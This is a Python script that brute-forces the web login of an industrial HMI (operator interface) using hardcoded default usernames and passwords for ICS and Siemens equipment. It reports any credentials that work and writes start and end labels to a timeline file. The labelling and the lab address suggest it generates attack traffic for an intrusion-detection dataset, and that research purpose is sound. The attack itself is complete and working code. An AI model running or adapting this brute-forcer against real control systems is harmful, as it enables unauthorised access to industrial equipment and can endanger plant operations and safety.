"""
HMI_CREDENTIAL_BRUTE
Kỹ thuật: Brute-force đăng nhập HMI web interface
Observable: Nhiều TCP SYN, HTTP 401/403 liên tiếp

Gọi từ bash:
  python -m attacks_ext.hmi_credential_brute \
      --duration 300 --target-url http://192.168.1.20:5000 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import time
import requests
from attacks_ext.config_ext import base_parser, write_label

ICS_PASSWORDS = [
    "admin", "admin123", "password", "1234", "12345",
    "siemens", "plc123", "scada", "operator", "engineer",
    "root", "toor", "pass", "test", "guest",
    "Admin@123", "Siemens1!", "WinCC123", "Step7",
    "administrator", "control", "system", "factory"
]

ICS_USERNAMES = ["admin", "operator", "engineer", "root", "administrator", "user"]


def try_login_web(url, username, password):
    try:
        resp = requests.post(
            f"{url}/login",
            data={"username": username, "password": password},
            timeout=3,
            allow_redirects=False
        )
        if resp.status_code in [200, 302]:
            if "token" in resp.text.lower() or "dashboard" in resp.text.lower():
                return True
        return False
    except requests.exceptions.ConnectionError:
        return False


def run(args):
    label_prefix = "HMI_CREDENTIAL_BRUTE"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s url={args.target_url}")

    attempts = 0
    success_count = 0
    found_credentials = []

    try:
        for username in ICS_USERNAMES:
            for password in ICS_PASSWORDS:
                attempts += 1
                success = try_login_web(args.target_url, username, password)
                status = "SUCCESS" if success else "FAIL"
                print(f"  [{attempts:03d}] {username}:{password} -> {status}")

                if success:
                    success_count += 1
                    found_credentials.append(f"{username}:{password}")
                    print(f"\n[!!!] CREDENTIALS FOUND: {username}:{password}\n")

                time.sleep(0.3)
                if attempts >= 50:
                    break
            if attempts >= 50:
                break

    except KeyboardInterrupt:
        print("\n[*] Dừng bởi người dùng")
    finally:
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"attempts={attempts} success={success_count} found={found_credentials}")
        print(f"\n[SUMMARY] Tổng: {attempts} lần thử, {success_count} thành công")


def main():
    p = base_parser("HMI Credential Brute Force Attack")
    p.add_argument("--target-url", default="http://192.168.1.20:5000")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
